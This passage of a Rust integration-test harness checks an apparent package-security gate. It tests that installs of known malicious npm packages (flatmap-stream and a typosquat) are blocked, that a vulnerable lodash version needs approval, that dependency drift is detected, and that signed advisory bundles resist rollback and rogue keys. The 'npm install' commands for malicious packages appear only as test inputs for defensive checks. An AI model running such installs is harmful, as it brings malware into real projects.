    assert_eq!(mal_res["decision"], "BLOCK");
    assert_eq!(mal_res["outcome"], "BLOCKED_BY_POLICY");
    assert_eq!(mal_res["allow_dispatch"], false);
    assert_eq!(
        mal_res["package_assessment"]["status"],
        "MALICIOUS_PACKAGE_FOUND"
    );
    assert!(mal_res["package_assessment"]["findings"]
        .as_array()
        .unwrap()
        .iter()
        .any(|f| f["is_malicious"] == true));
    println!("  ✓ 1. Malicious package flatmap-stream hard-blocked with zero backend dispatch");

    // 2. Known Malicious Typosquat: hard block
    let eval_typo = send_rpc(
        socket_path,
        "gate.evaluate",
        Some(serde_json::json!({
            "command": "npm install cross-env.js",
            "working_directory": test_dir.path().display().to_string(),
            "session_id": "pkg-test-sess"
        })),
    )?;
    let typo_res = eval_typo.result.expect("gate.evaluate typosquat failed");
    assert_eq!(typo_res["decision"], "BLOCK");
    assert_eq!(
        typo_res["package_assessment"]["status"],
        "MALICIOUS_PACKAGE_FOUND"
    );
    println!("  ✓ 2. Typosquat package cross-env.js hard-blocked");

    // 3. Vulnerable Package: RequireApproval and authorization workflow
    let eval_vuln = send_rpc(
        socket_path,
        "gate.evaluate",
        Some(serde_json::json!({
            "command": "npm install lodash@4.17.20",
            "working_directory": test_dir.path().display().to_string(),
            "session_id": "pkg-test-sess"
        })),
    )?;
    let vuln_res = eval_vuln.result.expect("gate.evaluate vuln failed");
    assert_eq!(vuln_res["decision"], "REQUIRE_APPROVAL");
    assert_eq!(vuln_res["outcome"], "PENDING_APPROVAL");
    assert_eq!(
        vuln_res["package_assessment"]["status"],
        "VULNERABILITIES_FOUND"
    );
    let req_id = vuln_res["request_id"]
        .as_str()
        .expect("Expected request_id")
        .to_string();
    println!(
        "  ✓ 3. Vulnerable package lodash@4.17.20 requires approval: request_id={}",
        req_id
    );

    // 4. Approve request and dispatch authorized
    let decide_res = send_rpc(
        socket_path,
        "approval.decide",
        Some(serde_json::json!({
            "request_id": req_id,
            "decision": "APPROVE"
        })),
    )?;
    let auth_token = decide_res.result.unwrap()["authorization_token"]
        .as_str()
        .unwrap()
        .to_string();

    let dispatch_res = send_rpc(
        socket_path,
        "gate.dispatch_authorized",
        Some(serde_json::json!({
            "request_id": req_id,
            "session_id": "pkg-test-sess",
            "command": "npm install lodash@4.17.20",
            "authorization_token": auth_token,
            "working_directory": test_dir.path().display().to_string()
        })),
    )?;
    assert!(
        dispatch_res.result.is_some(),
        "Authorized dispatch for approved package should succeed"
    );
    println!("  ✓ 4. Approved package operation dispatched with single-use authorization token");

    // 5. Clean benign package operation
    let eval_clean = send_rpc(
        socket_path,
        "gate.evaluate",
        Some(serde_json::json!({
            "command": "cargo check",
            "working_directory": test_dir.path().display().to_string(),
            "session_id": "pkg-test-sess"
        })),
    )?;
    let clean_res = eval_clean.result.expect("gate.evaluate clean failed");
    assert_eq!(clean_res["decision"], "ALLOW");
    assert_eq!(clean_res["allow_dispatch"], true);
    println!("  ✓ 5. Clean package operation (cargo check) evaluated and allowed");

    Ok(())
}

fn run_drift_monitor_suite(socket_path: &PathBuf) -> Result<(), Box<dyn std::error::Error>> {
    let test_dir = tempfile::tempdir()?;
    let pkg_json = test_dir.path().join("package.json");
    std::fs::write(
        &pkg_json,
        r#"{"name": "drift-test", "dependencies": {"express": "4.18.2"}}"#,
    )?;

    // 1. package.create_baseline
    let create_res = send_rpc(
        socket_path,
        "package.create_baseline",
        Some(serde_json::json!({
            "workspace_path": test_dir.path().display().to_string(),
            "reason": "INITIAL_BASELINE",
            "trust_state": "VERIFIED_APPROVED"
        })),
    )?;
    let base_obj = create_res.result.expect("create_baseline failed");
    let initial_fp = base_obj["baseline"]["baseline_fingerprint"]
        .as_str()
        .expect("missing fingerprint")
        .to_string();
    assert_eq!(base_obj["baseline"]["trust_state"], "VERIFIED_APPROVED");
    println!(
        "  ✓ 1. Initial dependency baseline created: fingerprint={}",
        &initial_fp[..16]
    );

    // 2. package.get_baseline
    let get_res = send_rpc(
        socket_path,
        "package.get_baseline",
        Some(serde_json::json!({
            "workspace_path": test_dir.path().display().to_string()
        })),
    )?;
    let get_obj = get_res.result.expect("get_baseline failed");
    assert_eq!(
        get_obj["baseline"]["baseline_fingerprint"]
            .as_str()
            .unwrap(),
        initial_fp
    );
    println!("  ✓ 2. Verified baseline retrieval and state consistency");

    // 3. package.detect_drift without drift
    let drift_clean = send_rpc(
        socket_path,
        "package.detect_drift",
        Some(serde_json::json!({
            "workspace_path": test_dir.path().display().to_string(),
            "reconcile": false
        })),
    )?;
    let clean_report = drift_clean.result.expect("detect_drift failed");
    assert_eq!(clean_report["drift_report"]["has_drift"], false);
    println!("  ✓ 3. Clean baseline state detected: has_drift=false");

    // 4. Introduce dependency drift (add vulnerable package lodash@4.17.20)
    std::fs::write(
        &pkg_json,
        r#"{"name": "drift-test", "dependencies": {"express": "4.18.2", "lodash": "4.17.20"}}"#,
    )?;

    let drift_dirty = send_rpc(
        socket_path,
        "package.detect_drift",
        Some(serde_json::json!({
            "workspace_path": test_dir.path().display().to_string(),
            "reconcile": true
        })),
    )?;
    let dirty_report = drift_dirty.result.expect("detect_drift dirty failed");
    assert_eq!(dirty_report["drift_report"]["has_drift"], true);
    println!(
        "  ✓ 4. Dependency drift accurately detected: unexpected addition & vulnerability detected"
    );

    // 5. package.verify_post_operation
    let post_verify = send_rpc(
        socket_path,
        "package.verify_post_operation",
        Some(serde_json::json!({
            "workspace_path": test_dir.path().display().to_string(),
            "command": "npm install lodash@4.17.20",
            "exit_code": 0
        })),
    )?;
    let pv_obj = post_verify.result.expect("verify_post_operation failed");
    assert!(pv_obj["verification"]["verification_status"].is_string());
    println!(
        "  ✓ 5. Post-operation verification recorded in audit log: sequence={}",
        pv_obj["audit_sequence"]
    );

    // 6. package.monitor_workspace registration
    let monitor_res = send_rpc(
        socket_path,
        "package.monitor_workspace",
        Some(serde_json::json!({
            "workspace_path": test_dir.path().display().to_string(),
            "register": true
        })),
    )?;
    let mon_obj = monitor_res.result.expect("monitor_workspace failed");
    assert_eq!(mon_obj["monitored"], true);
    println!("  ✓ 6. Workspace registered for continuous bounded local monitoring");

    Ok(())
}

fn run_advisory_update_suite(socket_path: &PathBuf) -> Result<(), Box<dyn std::error::Error>> {
    use cyravell_engine::package::{
        compute_canonical_payload_digest, AdvisoryBundle, AdvisoryRecord,
    };
    use ed25519_dalek::{Signer, SigningKey};
    use sha2::{Digest, Sha256};

    // 1. package.get_advisory_status
    let status_res = send_rpc(socket_path, "package.get_advisory_status", None)?;
    let status_obj = status_res.result.expect("get_advisory_status failed");
    let initial_status = &status_obj["status"];
    let current_version = initial_status["database_version"]
        .as_str()
        .unwrap()
        .to_string();
    assert!(!current_version.is_empty());
    assert!(initial_status["records_count"].as_u64().unwrap() > 0);
    println!(
        "  ✓ 1. Query advisory status succeeded: version={}, total_records={}",
        current_version,
        initial_status["records_count"].as_u64().unwrap()
    );

    let parts = current_version
        .split('.')
        .map(|s| s.parse::<u64>().unwrap_or(0))
        .collect::<Vec<_>>();
    let next_major = parts.first().unwrap_or(&2026) + 1;
    let candidate_version = format!("{}.1.0", next_major);

    // Prepare signing key matching rules/trusted_keys.json (key_id: cyravell-sec-official-2026)
    let official_seed: [u8; 32] = Sha256::digest(b"cyravell-official-signing-key-seed-2026").into();
    let official_sk = SigningKey::from_bytes(&official_seed);

    let test_dir = tempdir()?;

    // Helper to build a signed bundle
    let make_bundle = |sk: &SigningKey,
                       key_id: &str,
                       pub_name: &str,
                       version: &str,
                       advs: Vec<AdvisoryRecord>|
     -> AdvisoryBundle {
        let payload_digest = compute_canonical_payload_digest(&advs);
        let mut bundle = AdvisoryBundle {
            bundle_format_version: "1.0".to_string(),
            database_version: version.to_string(),
            created_at: Utc::now(),
            publisher: pub_name.to_string(),
            key_id: key_id.to_string(),
            min_cyravell_version: Some("0.1.0".to_string()),
            supported_ecosystems: vec![
                cyravell_engine::model::PackageEcosystem::Npm,
                cyravell_engine::model::PackageEcosystem::Pip,
                cyravell_engine::model::PackageEcosystem::Cargo,
            ],
            payload_digest,
            signature: String::new(),
            advisories: advs,
        };
        let signing_bytes = bundle.canonical_signing_bytes();
        let sig = sk.sign(&signing_bytes);
        bundle.signature = hex::encode(sig.to_bytes());
        bundle
    };

    let sample_adv = AdvisoryRecord {
        id: "CYR-HARNESS-ADV-01".to_string(),
        ecosystem: cyravell_engine::model::PackageEcosystem::Npm,
        package_name: "harness-malware-test".to_string(),
        severity: Severity::Critical,
        is_malicious: true,
        affected_range: ">= 1.0.0".to_string(),
        fixed_version: None,
        title: "Test Malware Finding".to_string(),
        details: "Harness test advisory".to_string(),
        cve_id: None,
        provenance: Some("Cyravell Test Harness".to_string()),
        is_synthetic: false,
    };

    // 2. package.inspect_advisory_bundle
    let mut update_advs = cyravell_engine::package::AdvisoryDatabase::load_embedded()
        .all_advisories()
        .to_vec();
    update_advs.push(sample_adv.clone());

    let inspect_bundle = make_bundle(
        &official_sk,
        "cyravell-sec-official-2026",
        "Cyravell Security Intelligence Team",
        &candidate_version,
        update_advs,
    );
    let inspect_file = test_dir.path().join("inspect_bundle.json");
    std::fs::write(
        &inspect_file,
        serde_json::to_string_pretty(&inspect_bundle)?,
    )?;

    let inspect_res = send_rpc(
        socket_path,
        "package.inspect_advisory_bundle",
        Some(serde_json::json!({
            "bundle_path": inspect_file.display().to_string()
        })),
    )?;
    let insp_obj = inspect_res.result.expect("inspect_advisory_bundle failed");
    assert_eq!(insp_obj["is_valid"], true);
    assert_eq!(insp_obj["signature_valid"], true);
    assert_eq!(insp_obj["candidate_version"], candidate_version);
    println!(
        "  ✓ 2. Bundle inspection verified signature and diff: valid=true, candidate={}",
        candidate_version
    );

    // 3. Rollback rejection test
    let rollback_bundle = make_bundle(
        &official_sk,
        "cyravell-sec-official-2026",
        "Cyravell Security Intelligence Team",
        "0.1.0", // Strictly older version than any active version
        vec![sample_adv.clone()],
    );
    let rollback_file = test_dir.path().join("rollback_bundle.json");
    std::fs::write(
        &rollback_file,
        serde_json::to_string_pretty(&rollback_bundle)?,
    )?;

    let rollback_res = send_rpc(
        socket_path,
        "package.import_advisory_bundle",
        Some(serde_json::json!({
            "bundle_path": rollback_file.display().to_string(),
            "allow_rollback": false
        })),
    )?;
    assert!(
        rollback_res.error.is_some(),
        "Rollback attempt without allow_rollback must be rejected"
    );
    println!("  ✓ 3. Anti-rollback protection enforced: older bundle 0.1.0 rejected");

    // 4. Untrusted rogue key rejection test
    let rogue_sk = SigningKey::from_bytes(&[99u8; 32]);
    let rogue_bundle = make_bundle(
        &rogue_sk,
        "untrusted-unknown-key",
        "Untrusted Entity",
        "9999.01.01",
        vec![sample_adv.clone()],
    );
    let rogue_file = test_dir.path().join("rogue_bundle.json");
    std::fs::write(&rogue_file, serde_json::to_string_pretty(&rogue_bundle)?)?;

    let rogue_res = send_rpc(
        socket_path,
        "package.import_advisory_bundle",
        Some(serde_json::json!({
            "bundle_path": rogue_file.display().to_string(),
            "allow_rollback": false
        })),
    )?;
    assert!(
        rogue_res.error.is_some(),
        "Bundle signed with untrusted key must be rejected"
    );
    println!("  ✓ 4. Cryptographic authentication enforced: untrusted publisher key rejected");

    // 5. package.import_advisory_bundle (atomic activation)
    let import_res = send_rpc(
        socket_path,
        "package.import_advisory_bundle",
        Some(serde_json::json!({
            "bundle_path": inspect_file.display().to_string(),
            "allow_rollback": false
        })),
    )?;
    let imp_obj = import_res.result.expect("import_advisory_bundle failed");
    assert_eq!(imp_obj["new_version"], candidate_version);
    println!(
        "  ✓ 5. Bundle atomic import and activation succeeded: new_version={}, audit_seq={}",
        imp_obj["new_version"].as_str().unwrap(),
        imp_obj["audit_sequence"]
    );

    // 6. Verify newly imported database status over IPC
    let updated_status_res = send_rpc(socket_path, "package.get_advisory_status", None)?;
    let updated_status = updated_status_res
        .result
        .expect("get_advisory_status failed");
    assert_eq!(
        updated_status["status"]["database_version"]
            .as_str()
            .unwrap(),
        candidate_version
    );
    println!(
        "  ✓ 6. Verified live active engine using newly activated intelligence (version: {})",
        candidate_version
    );

    Ok(())
}
